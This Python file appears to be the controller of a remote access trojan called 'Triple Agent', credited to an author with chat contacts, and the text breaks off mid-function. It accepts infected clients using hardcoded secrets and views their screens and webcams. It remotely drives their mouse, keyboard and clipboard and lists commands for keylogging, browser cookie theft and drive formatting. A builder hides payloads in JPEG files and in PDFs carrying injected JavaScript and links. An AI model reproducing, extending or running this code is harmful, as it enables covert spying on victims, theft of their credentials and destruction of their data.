try:
    import pyfiglet
    from rich import print
    from rich.console import Console
    import platform as platforms
    from sys import platform, maxsize
    import os, sys, shlex, re, subprocess, glob
    import socket, shutil
    import sqlite3
    import threading
    import time, keyboard
    import io,re
    import struct
    import pickle
    import imageio
    import ctypes
    import time
    import pyautogui
    import json, pyperclip
    from datetime import date
    from PIL import Image
    import cv2
    import numpy as np
    from PyPDF2 import *
    import base64
    from urllib.request import *
    import random
    
except Exception as e:
    print(e)

#signtool sign /a /fd SHA256 /tr http://timestamp.digicert.com /td SHA256 Windows.exe
    
#pip install --user pyfiglet opencv-python imageio Pillow keyboard pyautogui rich pypdf2


# pip install --user opencv-python
# pip install --user imageio
# pip install --user Pillow
# pip install --user keyboard
# pip install --user pyautogui
# pip install --user rich
# pip install --user pyfiglet

#kali Linux
#sudo apt install gdb
#sudo apt install gdb-minimal
#gdb python
#run app.py

#sys.setrecursionlimit(0)    # adjust numbers
#threading.stack_size(0)   # for your needs

_version = "1.0.3"

if platform == "win32":
    dir_path_doc = os.path.join(os.environ['USERPROFILE'], "Documents")
else:
    dir_path_doc = os.path.join(os.environ['HOME'], "Documents")

class settings:

    def __init__(self):
        self.data = {}

    def _start(self, path):

        with open(os.path.join(path, "settings.json"), "r") as jsonFile:
            self.data = json.load(jsonFile)

    def _json(self, obj):
        if len(self.data) > 0:
            return self.data[0][obj]
        return None

    def _update(self, obj, key, value):

        old_data = obj
        old_data[key] = value
        return old_data


class webcamSever():

    def __init__(self, objTriple, client_conn, client_addr_port, webcam_cv2):
        self.objTriple = objTriple()
        self.client_conn, self.client_addr_port = client_conn, client_addr_port
        self.title = f"RECEIVING WEBCAM - {client_addr_port}"
        self.setcam = True
        self.webcam_cv2 = webcam_cv2

    def _stop(self):
        self.setcam = False

    def _start(self):
        data = b''
        payload_size = struct.calcsize("Q")
        while self.setcam:

            try:
                # Retrieve message size
                while len(data) < payload_size:
                    data += self.client_conn.recv(4096)

                packed_msg_size = data[:payload_size]
                data = data[payload_size:]
                msg_size = struct.unpack("Q", packed_msg_size)[0]  # CHANGED
                # Retrieve all data based on message size
                while len(data) < msg_size:
                    data += self.client_conn.recv(4096)

                frame_data = data[:msg_size]
                data = data[msg_size:]

                # Extract frame
                frame = pickle.loads(frame_data)

                self.webcam_cv2.imshow(self.title, frame)
                self.webcam_cv2.waitKey(1)
            except Exception as e:
                #print(e)
                continue


class SceenView:

    def __init__(self, objTriple, client_conn, client_addr_port, _clientsize, _cv2screen):
        self.objTriple = objTriple()
        self._runkeys = True
        self._cv2screen = _cv2screen
        self.conn = client_conn
        self.setscreen = True
        self.client_conn, self.client_addr_port = client_conn, client_addr_port
        _addrclient, _portclient = client_addr_port
        self.title = f"SCREEN VIEWER  - {_addrclient} : {_portclient}"
        self.settings = self.objTriple.settings

        self.settings._start(self._config_path_doc)
        self._clientsize = _clientsize

    def _stop(self):
        self.setscreen = False



    def _screen_size(self):
        _size = self.settings._json("screensize")
        return _size["weight"], _size["height"]

    def _screen_position(self):
        _position = self.settings._json("screenposition")
        return _position["x"], _position["y"]


    def _start(self):

        if self.setscreen == False:
            return "stop"

        if self.setscreen == True:
            conn_socket = self.client_conn

            _WIDTH, _HEIGHT = self._screen_size()
            _X, _Y = self._screen_position()
            assert (conn_socket is not None)
            overhead_size = struct.calcsize('>III')
            payload_bin = b''

            while self.setscreen:
                try:

                    while len(payload_bin) < overhead_size:
                        received_data_bin = conn_socket.recv(8192)
                        if not received_data_bin:
                            raise StopIteration
                        payload_bin += received_data_bin

                    packed_payload_size = payload_bin[:overhead_size]
                    payload_bin = payload_bin[overhead_size:]

                    width, height, payload_size = \
                        struct.unpack('>III', packed_payload_size)
                    while len(payload_bin) < payload_size:
                        received_data_bin = conn_socket.recv(8192)
                        if not received_data_bin:
                            raise StopIteration
                        payload_bin += received_data_bin

                    encoded_screen_pkl = payload_bin[:payload_size]
                    payload_bin = payload_bin[payload_size:]

                    encoded_screen = pickle.loads(encoded_screen_pkl)
                    screen = self._cv2screen.imdecode(encoded_screen, flags=cv2.IMREAD_COLOR)
                    if (_WIDTH < width) and (_HEIGHT < height):
                        screen = self._cv2screen.resize(screen,
                                            (_WIDTH, _HEIGHT),
                                            interpolation=cv2.INTER_AREA)

                    # Show screen with no menu bar
                    #cv2.createButton('KeyBoard', self._cv2_keyevent,None,cv2.QT_PUSH_BUTTON,1)
                    self._cv2screen.imshow(winname=self.title, mat=screen)
                    self._cv2screen.moveWindow(self.title, _X, _Y)
                    self._cv2screen.namedWindow(winname=self.title,
                                    flags=self._cv2screen.WND_PROP_FULLSCREEN)



                    self._cv2screen.setWindowProperty(winname=self.title,
                                          prop_id=self._cv2screen.WND_PROP_FULLSCREEN,
                                          prop_value=self._cv2screen.WINDOW_FULLSCREEN)

                    self._cv2screen.setMouseCallback(self.title, self._cv2_event)

                    self._cv2screen.waitKey(1)
                    #if self._cv2screen.waitKey(1) == 27:
                    #raise StopIteration
                    #cv2.waitKey(20)
                    #self._cv2screen.destroyAllWindows(20)
                    # raise StopIteration

                except StopIteration as e:
                    try:
                        se = ""
                    except Exception as e:
                        #print(f"[ERROR 2], {e}")
                        break
                except Exception as e:
                    #print(f"[ERROR 3], {e}")
                    self.setscreen = False
                    return "stop"#break




    def _copyevent(self):
        try:
            _k = {"_copy": pyperclip.paste()}
            self.conn.send(str(_k).encode())
        except:
            pass

    def _keyevent(self):

        while self._runkeys:
            try:
                _keyinput  =  keyboard.read_key()
                if _keyinput == "esc":
                    self._runkeys = False

                _k = {"_keys": _keyinput}
                self.conn.send(str(_k).encode())
            except Exception as e:
                #print(e)
                pass



    def _cv2_event(self, event, x, y, flags, param):
        #Mouse Copy Event
        _copythread = ThreadWithReturnValue(target=self._copyevent, args=())
        if _copythread.is_alive() == False:
            _copythread.start()
        #_copythread.raise_exception()


        #Keyboard Event
        #self._cv2_keyevent()
        _keysthread = ThreadWithReturnValue(target=self._keyevent, args=())
        if _keysthread.is_alive() == False:
            _keysthread.start()
        #_keysthread.raise_exception()

        try:
            ws, hs = self._screen_size()
            w, h = self._clientsize
            aw, ah = w/ws, h/hs

            if event == cv2.EVENT_MOUSEMOVE:
                data_ = {"mouse-move": ((int(x) * aw)-1, (int(y)*ah)-1)}
                self.conn.send(str(data_).encode())

            if event == cv2.EVENT_LBUTTONUP:
                data_ = {"left-click": ((int(x) * aw)-1, (int(y)*ah)-1)}
                self.conn.send(str(data_).encode())

            if event == cv2.EVENT_LBUTTONDBLCLK:
                data_ = {"double-left-click": ((int(x) * aw)-1, (int(y)*ah)-1)}
                self.conn.send(str(data_).encode())

            if event == cv2.EVENT_RBUTTONUP or event == cv2.EVENT_RBUTTONDOWN :

                data_ = {"right-click": ((int(x) * aw)-1, (int(y)*ah)-1)}
                self.conn.send(str(data_).encode())

            if event == cv2.EVENT_LBUTTONDOWN:
                data_ = {"drag-move": ((int(x) * aw)-1, (int(y)*ah)-1)}
                self.conn.send(str(data_).encode())

            if event == cv2.EVENT_MOUSEWHEEL:
                data_ = {"move-scroll": flags/(hs+h)}
                self.conn.send(str(data_).encode())
        except:
            pass



class ScreenShot():

    def __init__(self) -> None:
        pass

    def reverse(self, tuples):
        new_tup = tuples[::-1]
        return new_tup

    def img_pause(self):
        print("...")
        return time.sleep(1)

    def delete(self, path_file):
        try:
            if os.path.exists(path_file) == True:
                os.remove(path_file)
                # print(f"{path_file} File Deleted")
        except:
            pass

    def check(self, filename):
        try:
            im = Image.open(filename)
            im.verify()
            im.close()
            im = Image.open(filename)
            im.transpose(Image.Transpose.FLIP_LEFT_RIGHT)
            im.close()
            return True
        except:
            return False


    def calsimilarity(self, original_img, old_img):
        if original_img != old_img:
            if self.check(old_img) == False:
                self.delete(old_img)
            else:

              try:
                  _orimage = cv2.imread(original_img)
                  sys_image = cv2.imread(old_img)
                  _sys_image = cv2.cvtColor(sys_image, cv2.COLOR_BGR2GRAY)

                  _original_image = cv2.cvtColor(_orimage, cv2.COLOR_BGR2GRAY)
                  h, w = _original_image.shape
                  diff = cv2.subtract(_original_image, _sys_image)
                  err = np.sum(diff**2)
                  mse = err/(float(h*w))
                  if mse < 3:
                      self.delete(old_img)
              except Exception as err:
                  pass


    def duplicate(self, path_dir, original_image_f):

        img_compare = False
        file_name_v = ""
        if self.check(original_image_f) == False:
            self.delete(original_image_f)
            img_compare = False
        else:
            if os.path.exists(original_image_f):
                [self.calsimilarity(original_image_f, os.path.join(path_dir, load_filename))  for load_filename in os.listdir(path_dir) if load_filename.endswith("PNG") or load_filename.endswith(str("png").lower())]





class ThreadWithReturnValue(threading.Thread):

    def __init__(self, group=None, target=None, name=None,
                 args=(), kwargs={}, Verbose=None):
        threading.Thread.__init__(self, group, target, name, args, kwargs)
        self._return = None

    def run(self):
        try:
            if self._target is not None:
                self._return = self._target(*self._args,
                                            **self._kwargs)
        except:
            pass

    def join(self, *args):
        threading.Thread.join(self, *args)
        self._return

    def get_id(self):

        # returns id of the respective thread
        if hasattr(self, '_thread_id'):
            return self._thread_id
        for id, thread in threading._active.items():
            if thread is self:
                return id

    def raise_exception(self):
        thread_id = self.get_id()
        res = ctypes.pythonapi.PyThreadState_SetAsyncExc(thread_id,
                                                         ctypes.py_object(SystemExit))
        if res > 1:
            ctypes.pythonapi.PyThreadState_SetAsyncExc(thread_id, 0)
            print('Exception raise failure')


class Triple_Agent:

    def __init__(self):
        self.console = Console()
        self.get_list_clients_port, self.list_port, self.active_clients = [], [], []
        self.client_conn_addr_port = None
        self.key_secret = ["C0nn3c+10n", "911Ka+on+40"]
        self.data_id, self.payload = None, None
        self.send_status = False
        self.client_conn = None
        self.client_addr_port = None
        self.settings = settings()
        self._port_ = 00000

        self._config_path_doc = os.path.join(dir_path_doc, "config")

        self.settings._start(self._config_path_doc)

        
        self.path_server = os.path.join(dir_path_doc, self.settings._json("path")["path_server"])
        self.path_payload = self.settings._json("path")["path_payload"]
        self.path_payload_in = self.settings._json("path")["payload_in"]
        self.path_payload_out = self.settings._json("path")["payload_out"]
        self.path_payload_template = self.settings._json("path")["payload_template"]

        _m = self.settings._json("menus")
        self.list_main_menu = _m["fm"]
        self.list_menu_act =_m["sm"]
        self.menu_s = _m["om"]
        self.menu_p = _m["pm"]

        
        self.createDir(self.path_server)
        self.createDir(self.path_payload)
        self.createDir(os.path.join(self.path_payload, self.path_payload_template))
        self.createDir(os.path.join(self.path_payload, self.path_payload_in))
        self._config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config")
        

        if not os.path.exists(self._config_path_doc):
            try:
                shutil.move(self._config_path, self._config_path_doc)
            except Exception as e:
                pass

        self._fileport = os.path.join(self._config_path_doc, "ports.txt")
        
        

        self.agent_headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
       'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
       'Accept-Encoding': 'none',
       'Accept-Language': 'en-US,en;q=0.8',
       'Connection': 'keep-alive'}

        self.server_socket = None
        self.identifiers = {
            'info': 0,
            'data': 1,
            'image': 2,
            'keylog': 3,
            'trailer': 4,
            'trailer-txt': 5,
            'trailer-rtf': 6,
            'sticky': 7,
            'sticky-set': 8,
            'screenshare': 9,
            'mouse-move': 10,
            'mouse-clickright': 11,
            'mouse-clickleft': 12,
            'mouse-copy': 13,
            'mouse-paste': 14,
            'mouse-up': 15,
            'mouse-down': 16,
            'mouse-scrollup': 17,
            'mouse-scrolldown': 18,
            'mouse-paste': 19,
            'keyboard-type': 20,
            'keyboard-enter': 21,
            'keyboard-back': 22,
            'keyboard-forward': 23,
            'screensize': 24,
            'webcam': 25,
            'files': 26,
            'screenshot': 27,
            'browserlogscookies': 28,
            'sendmessage': 29,
            'format_drive': 30,
            'disconnect': 31,
            'browserexplore':32,
            'uploadfile': 33
        }
        self._socket_status = True
        self._start_ = True


    def _urlvalidation(self, urlstr):

        regex = re.compile(
        r'^(?:http|ftp)s?://' # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
        r'localhost|' #localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
        r'(?::\d+)?' # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)


        return re.match(regex, urlstr) is not None

    def _ipinfo(self):

        hostname=socket.gethostname()
        IPAddr=socket.gethostbyname(hostname)
        RealIPAddr = ""
        try:
            #return hostname, IPAddr gethostbyname(), gethostbyaddr()

            if platform == "win32":
                cmd = "nslookup google.com. ns1.google.com"
                cmd = shlex.split(cmd)
                co = subprocess.Popen(cmd, shell = True, stdout = subprocess.PIPE)
                rawR = str(co.stdout.read().decode("utf-8")).split(":")
                ip_final = []
                for ipl_raw in rawR:
                    ip_replace = str(ipl_raw.replace(" ", ""))
                    re_ip = re.findall(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", ip_replace)
                    if len(re_ip):
                        ip_final.append(str(re_ip[0]))
                if len(ip_final) > 1:
                    ip_final = ip_final[1]
                RealIPAddr =  str(ip_final)
            else:
                cmd = "dig TXT +short o-o.myaddr.l.google.com @ns1.google.com"
                co = subprocess.Popen([cmd], shell = True, stdout = subprocess.PIPE)
                RealIPAddr = str(co.stdout.read().decode("utf-8")).replace('"', "")

            return hostname, IPAddr, RealIPAddr.replace("\n", "")

        except Exception as e:
            return hostname, IPAddr, RealIPAddr

    def _version(self):

        print(f"[bold blue] {pyfiglet.figlet_format('Triple Agent', justify='center')} [/bold blue]")
        print()
        print("[bold red]============================================[/bold red]")
        print(" || [bold yellow]Author:[/bold yellow] [bold white]Oliver Walker[/bold white]                ")
        print(" || [bold yellow]Jabber:[/bold yellow] [bold white]oliverwalker@xmpp.jp[/bold white]         ")
        print(" || [bold yellow]Telegram:[/bold yellow] [bold white]@oliverwalkerjp[/bold white]         ")
        print(f" || [bold green]Server:[/bold green] [bold white]{self._ipinfo()[1]}[/bold white]                  ")
        print(f" || [bold blue]Live:[/bold blue] [bold white]{self._ipinfo()[2]}[/bold white]                   ")
        print(f" || [bold red]Version: Latest: [bold blue]{_version}[/bold blue] [/bold red] [bold white] {time.strftime('%d-%m-%Y')} [/bold white] ")

        print("[bold blue]============================================[/bold blue]")


    def createDir(self, _path, mode=0o777):
        if os.path.exists(_path) == False:
            os.mkdir(_path, mode)


    def _setport(self, str_data):
        try:
            with open(self._fileport, "a+") as _port:
                _port.write(str_data)
            return True
        except:
            return True

    def payload_server(self):
        try:
            print("[bold yellow]=====================PAYLOAD=======================[/bold yellow]")
            print(f" [bold red]*[/bold red] Create a payload port and file formate        [bold red]*[/bold red]")
            print(f" [bold red]*[/bold red] Create a port forwarding to your server       [bold red]*[/bold red]")
            print(f" [bold red]*[/bold red] Connect your client from any location.        [bold red]*[/bold red]")
            print(f" [bold red]*[/bold red] Payload output [PDF, IMAGE].                  [bold red]*[/bold red]")
            print("[bold yellow]===================================================[/bold yellow]")

            print("\n[bold red]=========== TEMPLATE =========== [/bold red]\n")
            _opdefualt_path = self.console.input("[bold red][+][/bold red] Defualt Template Path [bold blue](n/y)[/bold blue] : ")
            _defaulttempath, _defaultpayloadpath = "", ""
            if _opdefualt_path == "y":
                i = 0
                _pathtemplate = []
                _ospathtem = os.path.join(self.path_payload, self.path_payload_template)
                _lpathtem = os.listdir(_ospathtem)
                if len(_lpathtem) > 0:
                    for _tempath in _lpathtem:
                        i +=1
                        _pathtemplate.append(_tempath)
                        print(f"[{i}] {_tempath}")

                    _chosepath = self.console.input("[bold blue]Choose[/bold blue]: ")
                    if _chosepath.isnumeric():
                        _tempath = _pathtemplate[int(_chosepath) - 1]
                        _defaulttempath = os.path.join(self.path_payload, self.path_payload_template, _tempath)

            elif _opdefualt_path == "n" or _opdefualt_path == "":
                _manpatempath = self.console.input("[bold yellow][*][/bold yellow] Enter Template [bold blue]Path[/bold blue]/[bold blue]Url[/bold blue]: ")
                if _manpatempath.isnumeric() == False and (os.path.isfile(_manpatempath) == True or self._urlvalidation(_manpatempath) == True):
                    _defaulttempath = _manpatempath
            else:
                self.payload_server()

            print("\n[bold red]=========== PAYLOAD ===========[/bold red]\n")

            _opdefualt_payload = self.console.input("[bold red][+][/bold red] Defualt Payload Path [bold blue](n/y)[/bold blue] : ")

            if _opdefualt_payload == "y":
                _pathpayload = []
                _ospathpay = os.path.join(self.path_payload, self.path_payload_in)
                _lpathpay = os.listdir(_ospathpay)
                i = 0
                for _paypath in _lpathpay:
                    i +=1
                    _pathpayload.append(_paypath)
                    print(f"[{i}] {_paypath}")
                _chosepath = self.console.input("[bold blue]Choose[/bold blue]: ")
                if _chosepath.isnumeric():
                    _pathpay = _pathpayload[int(_chosepath) - 1]
                    _defaultpayloadpath = os.path.join(self.path_payload, self.path_payload_in, _pathpay)



            elif _opdefualt_payload == "n" or _opdefualt_payload == "":
                _manpaypath = self.console.input("[bold yellow][*][/bold yellow] Enter Payload Path:")
                if _manpaypath.isnumeric() == False and os.path.isfile(_manpaypath) == True:
                    _defaultpayloadpath = _manpaypath
            else:
                _defaultpayloadpath = ""

            print("\n[bold red]=========== CREATE ===========[/bold red]\n")



            i = 0
            for main_me in self.menu_p:
                i += 1
                if main_me != "Quit":
                    print(f"[[bold blue]{i}[/bold blue]] {main_me} ")
                else:
                    print(f"[[bold yellow]*[/bold yellow]] [bold yellow]Back[/bold yellow]")
                    print(f"[[bold red]Q[/bold red]] [bold red]{main_me}[/bold red]")

            _filetypeinput = self.console.input("\n[bold blue]Enter Connection[/bold blue] : ")
            _svurl, _filepaswd = "", ""
            if _filetypeinput.isnumeric() == True:
                _filetype = self.menu_p[int(_filetypeinput)-1]
                if _filetype.lower() == "pdf":
                    _filename = self.console.input("\nEnter out file name [bold blue]vr-adobe.pdf[/bold blue] : ")
                    if _filename == "":
                        _filename = "vr-adobe.pdf"
                    else:
                        _filename = f"{_filename.replace('.pdf', '')}.pdf"

                    _svurl = self.console.input("\nEnter Payload  [bold blue]URL[/bold blue] : ")

                    _filepaswd = self.console.input("\nEnter PDF [bold blue]Password[/bold blue] : ")


                if _filetype.lower() == "image":
                    _filename = self.console.input("\nEnter out file name [bold blue]vr-image.jpeg[/bold blue] : ")
                    if _filename == "":
                        _filename = "vr-image.jpeg"
                    else:
                        _filename = f"{_filename.replace('.jpeg', '')}.jpeg"



                self.create_payload(_filetype, _filename,  _defaulttempath ,_defaultpayloadpath, _svurl, _filepaswd)

            else:
                if _filetypeinput == "*":
                    self.main_menu()
                if _filetypeinput.lower() == "q":
                    self.off()

        except Exception as e:
            print(e)

    def _removeos(self, pathfile):
        if os.path.exists(pathfile) == True:
            try:
                os.system(f"rm -rf {pathfile}")
            except:
                os.remove(pathfile)


    def _urljpeg(self, urlstr, filenamepath):
        try:
            remoteFile = urlopen(Request(urlstr, headers=self.agent_headers))
            if remoteFile.status == 200 and remoteFile.reason == "OK":
                memoryFile = io.BytesIO(remoteFile.read())# io.StringIO()
                _spliturl = urlstr.split("/")[-1]
                _newfilepath = os.path.join(filenamepath, _spliturl)
                img_  = Image.open(memoryFile)
                img_.save(_newfilepath)
                return _newfilepath
            else:
                return False
        except Exception as e:
            return False

    def _urlpdf2(self, urlstr, filenamepath):
        try:

            writer = PdfWriter()

            remoteFile = urlopen(Request(urlstr, headers=self.agent_headers))
            if remoteFile.status == 200 and remoteFile.reason == "OK":
                memoryFile = io.BytesIO(remoteFile)# io.StringIO()
                pdfFile = PdfReader(memoryFile)
                for pageNum in range(len(pdfFile.pages)):
                    currentPage = pdfFile.pages[pageNum]
                    #currentPage.mergePage(watermark.getPage(0))
                    writer.add_page(currentPage)

                _spliturl = urlstr.split("/")[-1]
                _newfilepath = os.path.join(filenamepath, _spliturl)
                outputStream = open(_newfilepath,"wb")
                writer.write(outputStream)
                outputStream.close()
                return _newfilepath
            else:
                return False

        except Exception as e:
            return False

    def create_payload(self, file_type, filename, template, payload="", _svurl="", _filepaswd=""):
        if file_type.lower() == "pdf":
            _creatpayload = self._payloadPDF(filename, template, payload, _svurl, _filepaswd)
            if _creatpayload == True:
                self.main_menu()

        if file_type.lower() == "image":
            _creatpayload = self._payloadJPEG(filename, template, payload)
            if _creatpayload == True:
                self.main_menu()

    def _payloadJPEG(self, filename, template, payload=""):
        try:
            print ("[bold yellow][+][bold yellow] [bold white]Generating JPEG file[bold white][bold yellow]...[bold yellow]")
            _filenamepath = os.path.join(self.path_payload, self.path_payload_out)
            _template = template
            if self._urlvalidation(template) == True:
                if  self._urljpeg(template, _filenamepath) !=False:
                    _template = self._urljpeg(template, _filenamepath)

            print ("[bold yellow][+][bold yellow] [bold white]Reading file[bold white][bold yellow]...[bold yellow] ")
            time.sleep(1)
            with open(_template, "rb") as tp_input:
                templ_input = tp_input.read()

            print("[bold yellow][+][bold yellow] [bold white]Creating Image [/bold white][bold yellow]...[bold yellow]")
            time.sleep(1)
            _filename = os.path.join(_filenamepath, filename)
            with open(_filename, "wb") as fb_output:
                fb_output.write(templ_input)

            print("[bold yellow][+][bold yellow] [bold white]Creating Image [/bold white][bold yellow]...[bold yellow]")
            time.sleep(1)
            with open(payload, "rb") as payload_input:
                _payload_ = payload_input.read()

            print ("[bold yellow][+][bold yellow] [bold white]Binding PAYLOAD file[bold white][bold yellow]...[bold yellow]")
            time.sleep(1)
            with open(_filename, 'ab') as tp_output:
                templ_output = tp_output.write(_payload_)

            time.sleep(1)

            if self._urlvalidation(template) == True:
                self._removeos(_template)

            print("[bold yellow][+][bold yellow] [bold white]Created Successfully[/bold white][bold yellow]...[bold yellow]")

            return True
        except Exception as e:
            #print("mez",e)
            return False

    def _payloadPDF(self, filename, template, payload="", _svurl="", _filepaswd=""):

        try:
            _filenamepath = os.path.join(self.path_payload, self.path_payload_out)
            print()
            print ("[bold yellow][+][bold yellow] [bold white]Generating PDF file[bold white][bold yellow]...[bold yellow]")
            self.createDir(_filenamepath)
            _template = template
            if self._urlvalidation(template) == True:
                if  self._urlpdf2(template, _filenamepath) !=False:
                    _template = self._urlpdf2(template, _filenamepath)

            templ_input = PdfReader(open(_template, 'rb'))
            templ_output = PdfWriter()
            print ("[bold yellow][+][bold yellow] [bold white]Reading file[bold white][bold yellow]...[bold yellow] ")
            time.sleep(1)

            _cname =  payload.split("/")[-1]

            _svurl = _svurl if self._urlvalidation(_svurl) == True else ""


            #Javascript
            _jsscript = os.path.join(self._config_path_doc, "script.js")
            _javascript = ""
            with open(_jsscript, 'r') as _script:
                _javascript= _script.read()

            if os.path.exists(_jsscript) == True and _javascript !="":
                _jscript = _javascript.replace('_url', _svurl).replace('_cename', _cname)
                print("[bold yellow][+][bold yellow] [bold white]Add JS Scripting [/bold white][bold yellow]...[bold yellow]")
                # Add Javascript
                templ_output.add_js("%s"%(_jscript))
                time.sleep(1)

            templ_output.append_pages_from_reader(templ_input)

            for _ltempl_pages in range(len(templ_input.pages)):
                #Add Annontation LINK
                if self._urlvalidation(_svurl) == True:
                    templ_output.add_uri(page_number=_ltempl_pages, uri=_svurl, rect=(0, 0, 800, 1200) )
            if _filepaswd !="":
                print("[bold yellow][+][bold yellow] [bold white]Creating encryption [/bold white][bold yellow]...[bold yellow]")
                templ_output.encrypt(user_password=_filepaswd, owner_password=None, use_128bit=True)
                time.sleep(1)

            #print("[bold yellow][+][bold yellow] [bold white]Deleting  Temporary file[/bold white][bold yellow]...[bold yellow]")
            #time.sleep(1)
            #_paybase64_ =  base64.b64encode(_paybase64)

            if payload !="":
                print ("[bold yellow][+][bold yellow] [bold white]Binding PAYLOAD file[bold white][bold yellow]...[bold yellow]")
                #Add / Attached Payload
                with open(payload, 'rb') as _payload:
                    templ_output.add_attachment("%s"%(_cname), _payload.read())
                    time.sleep(1)

            print ("[bold yellow][+][bold yellow] [bold white]Creating file[bold white][bold yellow]...[bold yellow]")


            _filename = os.path.join(_filenamepath, filename)
            with open(_filename, 'wb') as _filestreamspdf:
                templ_output.write(_filestreamspdf)

            time.sleep(1)

            if self._urlvalidation(template) == True:
                self._removeos(_template)

            print("[bold yellow][+][bold yellow] [bold white]Created Successfully[/bold white][bold yellow]...[bold yellow]")
            return True
        except Exception as e:
            #print("mez",e)
            return False

    def register_port(self):
        try:
            print("[bold red]\n=========== REGISTER CONNECTION PORT ============\n[/bold red]")

            input_port = self.console.input("\nEnter Port[bold blue]1234[/bold blue]: ")
            if input_port.isnumeric() == True:
                if self._setport(f"{input_port}\n") == True:
                    return True
            else:
                return False
        except KeyboardInterrupt:
            self._start()


    def receive(self, conn):
        try:
            # receive first 4 bytes of data as data size of payload
            data_size = struct.unpack('>I', conn.recv(4))[0]
            # print(data_size)
            # receive next 4 bytes of data as data identifier
            data_id = struct.unpack('>I', conn.recv(4))[0]
            # print(data_id)
            # receive payload till received payload size is equal to data_size received
            received_payload = b""
            reamining_payload_size = data_size
            while reamining_payload_size != 0:
                received_payload += conn.recv(reamining_payload_size)
                reamining_payload_size = data_size - len(received_payload)

            payload = pickle.loads(received_payload)
            self.data_id, self.payload = data_id, payload
        except Exception as e:
            #print(f"[ERROR] Receive : {e}")
            self.data_id, self.payload = '400', 'error'

    def send(self, conn, payload, data_id=0):
        try:
            # serialize payload
            serialized_payload = pickle.dumps(payload)
            # send data size, data identifier and payload
            conn.sendall(struct.pack('>I', len(serialized_payload)))
            conn.sendall(struct.pack('>I', data_id))
            conn.sendall(serialized_payload)
            self.send_status = True
        except:
            self.send_status = False


    def check_clients_addr_port(self, client_all):
        try:
            client_conn, client_addr_port = client_all
            (client_addr, client_port) = client_addr_port
            # server_socket.connect(client_addr_port)
            self.receive(client_conn)
            if self.payload in self.key_secret:
                self.send(client_conn, "Connection accepted")
                # print("good")
                return True
            else:
                return False
        except Exception as e:
            return False

    def establish_new_connect(self, port, _socket_status):
        self.clear_list_active_connection()
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind(('', int(port)))
            self.server_socket.listen(5)
            
            while True:
                try:
                    if not _socket_status():
                        break

                    self.client_conn, self.client_addr_port = self.server_socket.accept()
                    for list_clients_port in [[self.client_conn, self.client_addr_port]]:
                        if self.check_clients_addr_port(list_clients_port) == True:
                            self.active_clients.append(list_clients_port)


                except Exception as e:
                    
                    pass
        except socket.error as err:
            self.server_socket.close()
            pass
        except Exception as e:
            pass

    def clear_list_active_connection(self):
        self.active_clients.clear() if len(self.active_clients) > 0 else self.active_clients
        try:
            self.client_conn.close()
        except Exception as e:
            pass

        
    
    def active_connection(self, port):
        self._socket_status = True
        self.start_conn_thread = threading.Thread(target=self.establish_new_connect, args=(port, lambda:self._socket_status))
        if self.start_conn_thread.is_alive() == False:
            self.start_conn_thread.start()

        time.sleep(10)
        if len(self.active_clients) > 0:
            self._socket_status = False
            
            i = 0
            self._clear()
            self._version()
            print(f"\n[bold red]============ LIVE ACTIVE SESSION ({len(self.active_clients)}) ================[/bold red]\n")
            for list_clients_port in self.active_clients:
                i += 1
                client_conn, client_addr_port = list_clients_port
                (client_addr, client_port) = client_addr_port
                print(f"[{i}] {client_addr}:{client_port}.session")
            
            print("[[bold yellow]#[/bold yellow]] [bold yellow]Back[/bold yellow]")
            print("[[bold green]R[/bold green]] [bold green]Reconnect[/bold green]")
            print("[[bold red]Q[/bold red]] [bold red]Quit[/bold red]")
            
        
            input_session_me = self.console.input("\n[bold blue]Choose:  [/bold blue]")
            
            if input_session_me.isnumeric() == True:
                client_conn_addr_port = self.active_clients[int(
                        input_session_me)-1]

                
                self.client_conn_addr_port = client_conn_addr_port
                self.client_conn, self.client_addr_port = self.client_conn_addr_port
                (self.client_addr, self.client_port) = self.client_addr_port

                self.new_action_menu()
            
            if input_session_me.isnumeric() == False:
                if str(input_session_me).lower() ==  "r":
                    input_session_me = ""
                    return self.active_connection(port)
                
                if input_session_me ==  "#":
                    self.new_connection()
                
                if str(input_session_me).lower() ==  "q":
                    self.off()


        else:
            return self.active_connection(port)

    def savefiles(self, folder_path, file_name, file_data, mode="w"):
        #_fileexe = file_name.split(".")[-1]
        _filename = file_name
        _filedata = file_data
        _folderpath = os.path.join(folder_path, _filename)
        try:
            _openfile = open(_folderpath, mode)
            _openfile.write(_filedata)
        except Exception as e:
            _openfile = open(_folderpath, mode="wb")
            _openfile.write(_filedata)

        _openfile.close()

            
    def _threadscreenshot(self, client_conn):

        self.client_path = os.path.join(self.path_server, self.client_addr)
        self.createDir(self.client_path)
        _screenshotmanager = os.path.join(self.client_path, "ScreenShot")
        self.createDir(_screenshotmanager)

        _status = True
        _inscree = ['Start', 'Stop', 'Back']

        while _status:
            try:

                print("\n [bold blue]======== SCREENSHOT ACTION ======== [/bold blue]\n")
                i = 0
                for _lscren in _inscree:
                    i +=1
                    print(f"[[bold red]{i}[/bold red]] {_lscren}")

                try:
                    _opinp = self.console.input("\n[bold red]Choose[/bold red] :")
                    if _opinp.isnumeric() == True:
                        _date_act = _inscree[int(_opinp)-1]
                        self.send(client_conn, _date_act.lower())
                        if _date_act.lower() == "back":
                            _status = False

                except KeyboardInterrupt as e:
                    self.send(client_conn, "abort")
                    _status = False
                except Exception as e:
                        pass


            except Exception as e:
                print(f"[Error] : Recieving Screenshots Action  {e}")



    def _autoreceivefiles(self, client_conn, _start_):
        self.client_path = os.path.join(self.path_server, self.client_addr)
        self.createDir(self.client_path)
        self.send(client_conn, "ready")
        
        while True:
            try:
                self.receive(client_conn)
                if type(self.payload) is dict:
                    
                    payload = self.payload


